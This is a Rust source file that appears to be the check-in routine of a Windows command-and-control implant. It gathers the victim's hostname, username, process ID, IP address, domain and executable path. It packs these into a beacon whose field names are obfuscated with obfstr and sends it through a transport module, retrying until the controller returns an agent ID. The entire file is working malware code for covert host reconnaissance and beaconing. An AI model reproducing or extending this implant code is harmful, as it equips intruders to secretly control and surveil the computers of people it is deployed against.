use obfstr::obfstr;
use crate::config;
use crate::transport;

use std::ptr;

use winapi::shared::minwindef::DWORD;
use winapi::um::winnt::{TOKEN_USER, TokenUser, TOKEN_QUERY, SID_NAME_USE};
use winapi::um::winbase::LookupAccountSidW;
use winapi::um::winnt::PSID;
use winapi::um::processthreadsapi::{GetCurrentProcessId, GetCurrentProcess, OpenProcessToken};
use winapi::um::securitybaseapi::GetTokenInformation;
use windows_sys::Win32::Foundation::FALSE;
use std::ffi::OsString;
use std::os::windows::ffi::OsStringExt;

pub fn get_hostname_syscall() -> Option<String> {
    unsafe {
        let mut buffer = [0u16; 256];
        let mut size: DWORD = buffer.len() as DWORD;
        let result = winapi::um::winbase::GetComputerNameW(
            buffer.as_mut_ptr(),
            &mut size,
        );
        if result == 0 || size == 0 {
            return None;
        }
        let hostname = OsString::from_wide(&buffer[..size as usize]);
        Some(hostname.to_string_lossy().into_owned())
    }
}

fn get_pid_via_syscall() -> u32 {
    unsafe { GetCurrentProcessId() }
}

fn get_current_username_syscall_direct() -> Result<String, String> {
    unsafe {
        let mut token_handle: *mut core::ffi::c_void = ptr::null_mut();
        let result = OpenProcessToken(
            GetCurrentProcess(),
            TOKEN_QUERY,
            &mut token_handle as *mut _ as *mut *mut winapi::ctypes::c_void,
        );

        if result == 0 {
            return Err(format!("OpenProcessToken failed: {}", std::io::Error::last_os_error()));
        }

        let mut return_length = 0u32;
        let _ = GetTokenInformation(
            token_handle as *mut winapi::ctypes::c_void,
            TokenUser,
            ptr::null_mut(),
            0u32,
            &mut return_length,
        );

        let mut buffer = vec![0u8; return_length as usize];
        let token_user = buffer.as_mut_ptr() as *mut TOKEN_USER;

        let result = GetTokenInformation(
            token_handle as *mut winapi::ctypes::c_void,
            TokenUser,
            buffer.as_mut_ptr() as *mut winapi::ctypes::c_void,
            return_length,
            &mut return_length,
        );

        winapi::um::handleapi::CloseHandle(token_handle as *mut winapi::ctypes::c_void);

        if result == 0 {
            return Err(format!("GetTokenInformation failed: {}", std::io::Error::last_os_error()));
        }

        let mut name = [0u16; 256];
        let mut domain = [0u16; 256];
        let mut name_len = name.len() as DWORD;
        let mut domain_len = domain.len() as DWORD;
        let mut sid_use = SID_NAME_USE::default();

        if LookupAccountSidW(
            ptr::null_mut(),
            (*token_user).User.Sid as PSID,
            name.as_mut_ptr(),
            &mut name_len,
            domain.as_mut_ptr(),
            &mut domain_len,
            &mut sid_use,
        ) == FALSE {
            return Err(format!("LookupAccountSidW failed: {}", std::io::Error::last_os_error()));
        }

        let username = OsString::from_wide(&name[..name_len as usize]);
        Ok(username.to_string_lossy().into_owned())
    }
}

pub fn checkin() {
    crate::dlog!("checkin: resolve hostname");
    let hostname = get_hostname_syscall()
        .or_else(|| std::env::var("COMPUTERNAME").ok())
        .unwrap_or_else(|| "Unknown".to_string());
    crate::dlog!("checkin: hostname={hostname}");

    crate::dlog!("checkin: resolve username");
    let username = match get_current_username_syscall_direct() {
        Ok(u) => {
            crate::dlog!("checkin: username={u}");
            u
        }
        Err(e) => {
            crate::dlog!("checkin: username failed: {e}");
            std::env::var("USERNAME").unwrap_or_else(|_| "Unknown".to_string())
        }
    };

    crate::dlog!("checkin: resolve pid");
    let pid = get_pid_via_syscall();
    crate::dlog!("checkin: pid={pid}");

    let ips: Vec<String> = std::net::UdpSocket::bind("0.0.0.0:0")
        .and_then(|s| { s.connect("8.8.8.8:80")?; s.local_addr() })
        .map(|a| vec![a.ip().to_string()])
        .unwrap_or_default();

    let sleep_info = format!(
        "{}s jitter {}%",
        *config::callback_interval.read().unwrap(),
        *config::callback_jitter.read().unwrap(),
    );

    let checkin_data = serde_json::json!({
        obfstr!("action"): obfstr!("checkin"),
        obfstr!("uuid"): *config::UUID,
        obfstr!("os"): "windows",
        obfstr!("user"): username,
        obfstr!("host"): hostname,
        obfstr!("pid"): pid,
        obfstr!("architecture"): "x64",
        obfstr!("domain"): std::env::var("USERDOMAIN").unwrap_or_default(),
        obfstr!("ips"): ips,
        obfstr!("integrity_level"): 2,
        obfstr!("external_ip"): "",
        obfstr!("process_name"): std::env::current_exe()
            .map(|p| p.to_string_lossy().to_string())
            .unwrap_or_default(),
        obfstr!("sleep_info"): sleep_info,
    });

    let json_str = serde_json::to_string(&checkin_data).unwrap();

    crate::helpers::churn(hostname.as_str());
    crate::helpers::churn(username.as_str());

    let mut attempt: u32 = 0;
    loop {
        attempt += 1;
        crate::dlog!("checkin: post attempt={attempt}");
        match transport::send_request_with_response(&json_str) {
            Ok(resp) => {
                if let Some(id) = resp.get("id").and_then(|v| v.as_str()) {
                    crate::dlog!("checkin: success agent_id={id}");
                    crate::helpers::churn(id);
                    let mut uuid = config::UUID.write().unwrap();
                    *uuid = id.to_string();
                    return;
                }
                crate::dlog!("checkin: response missing id: {resp}");
            }
            Err(e) => {
                crate::dlog!("checkin: transport err: {e}");
            }
        }
        crate::helpers::idle();
    }
}
